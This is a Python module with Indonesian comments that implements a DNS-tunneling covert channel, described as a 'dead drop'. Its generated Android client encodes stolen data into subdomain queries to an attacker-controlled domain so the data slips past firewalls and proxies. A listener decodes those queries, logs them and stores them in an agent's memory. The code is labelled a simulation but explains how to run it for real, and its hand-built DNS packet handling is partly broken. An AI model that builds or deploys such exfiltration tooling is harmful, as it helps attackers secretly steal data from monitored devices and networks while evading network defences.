"""
DEAD DROP DNS TUNNELING (Fase 4B)
==================================
Protokol Komunikasi Klandestin.
Sistem ini memungkinkan agen Android mengirim pesan atau "Heartbeat" ke VPS 
melalui jaringan DNS (resolusi nama domain palsu), 
sehingga lolos dari pantauan Firewall, Proxy, atau Captive Portal.
"""
import logging
import base64
import socket
import threading
from urllib.request import Request, urlopen
import time
import os

log = logging.getLogger("DNSTunnel")

class DeadDropDNS:
    # Dummy domain base untuk simulasi (di dunia nyata, gunakan domain asli yang DNS nameserternya dikendalikan VPS)
    BASE_DOMAIN = "sovereign-intel.com"
    INTEL_DIR = os.path.join(os.path.dirname(__file__), "..", "knowledge", "dns_tunnel")

    @staticmethod
    def _encode_payload(data: str) -> str:
        """Mengonversi data menjadi subdomain yang valid."""
        encoded = base64.b32encode(data.encode('utf-8')).decode('utf-8').strip('=')
        # DNS membatasi 63 karakter per label. Kita potong jika terlalu panjang.
        return encoded[:60]

    @staticmethod
    def _decode_payload(subdomain: str) -> str:
        """Mengembalikan subdomain menjadi data teks."""
        try:
            # Tambahkan padding '=' kembali jika diperlukan
            padding = '=' * (8 - (len(subdomain) % 8)) if len(subdomain) % 8 != 0 else ''
            return base64.b32decode((subdomain + padding).encode('utf-8')).decode('utf-8')
        except Exception as e:
            return f"[DECODE ERROR: {e}]"

    @staticmethod
    def generate_android_dns_client():
        """
        Menghasilkan skrip Android (Python) yang akan memaksa resolusi DNS 
        melalui Google DNS (8.8.8.8) untuk mengirim data curian.
        """
        client_script = f"""
import socket
import base64

def send_intel_via_dns(intel_str):
    # Encode ke Base32 agar aman untuk nama domain
    encoded = base64.b32encode(intel_str.encode('utf-8')).decode('utf-8').strip('=')[:60]
    fake_domain = f"{{encoded}}.{DeadDropDNS.BASE_DOMAIN}"
    try:
        # Melakukan 'gethostbyname' memaksa query DNS keluar dari jaringan
        socket.gethostbyname(fake_domain)
    except socket.gaierror:
        pass # Ini normal, karena domain palsu ini tidak akan meresolve IP yang valid
"""
        return client_script

    @staticmethod
    def start_dns_listener(port=5353):
        """
        [SIMULASI] Menjalankan server UDP sederhana untuk menangkap request DNS masuk.
        (Di Linux produksi, ini harus port 53 dengan akses Root).
        """
        def listen():
            try:
                # Membuat UDP socket
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.bind(("0.0.0.0", port))
                log.info(f"[DNS-TUNNEL] Listener aktif di port {port} UDP (Simulasi Dead Drop).")
                
                while True:
                    data, addr = s.recvfrom(512)
                    # Parsing DNS packet secara ekstrem (sederhana untuk simulasi)
                    # Kita cari string yang mengandung BASE_DOMAIN
                    try:
                        # Extract the domain from the DNS query payload
                        packet_str = data.decode('utf-8', errors='ignore')
                        if DeadDropDNS.BASE_DOMAIN in packet_str:
                            # Parse out the subdomain prefix
                            parts = packet_str.split(DeadDropDNS.BASE_DOMAIN)[0].split('\x03')[-1]
                            # Hapus karakter non-alfanumerik dari payload b32
                            clean_b32 = ''.join(c for c in parts if c.isalnum())
                            
                            if clean_b32:
                                decoded_msg = DeadDropDNS._decode_payload(clean_b32)
                                log.critical(f"[DNS-TUNNEL] PESAN KLANDESTIN DITERIMA DARI {addr[0]}: {decoded_msg}")
                                
                                # Simpan log
                                os.makedirs(DeadDropDNS.INTEL_DIR, exist_ok=True)
                                with open(os.path.join(DeadDropDNS.INTEL_DIR, "dead_drops.log"), "a") as f:
                                    f.write(f"[{time.ctime()}] IP: {addr[0]} | MSG: {decoded_msg}\n")
                                    
                                # Teruskan ke Vector Memory
                                try:
                                    from vector_memory import vector_memory
                                    vector_memory.add_experience(
                                        text=f"Dead Drop received via DNS: {decoded_msg}",
                                        metadata={"source": "dns_tunnel", "type": "covert_channel"}
                                    )
                                except: pass
                    except Exception as e:
                        pass
            except Exception as e:
                log.error(f"[DNS-TUNNEL] Gagal menjalankan listener: {e}")

        t = threading.Thread(target=listen, daemon=True)
        t.start()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    print("--- INITIATING DEAD DROP DNS TUNNEL ---")
    DeadDropDNS.start_dns_listener(port=5353)
    
    time.sleep(1)
    print("\n[SIMULATION] Android Agent is transmitting intel via DNS resolve...")
    
    # Simulate client sending data
    import socket
    test_msg = "TARGET_LOCATION_ACQUIRED"
    encoded_test = DeadDropDNS._encode_payload(test_msg)
    fake_query = f"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03{encoded_test}\x13{DeadDropDNS.BASE_DOMAIN}\x00"
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(fake_query.encode(), ("127.0.0.1", 5353))
    
    time.sleep(2)
    print("--- TEST COMPLETE ---")
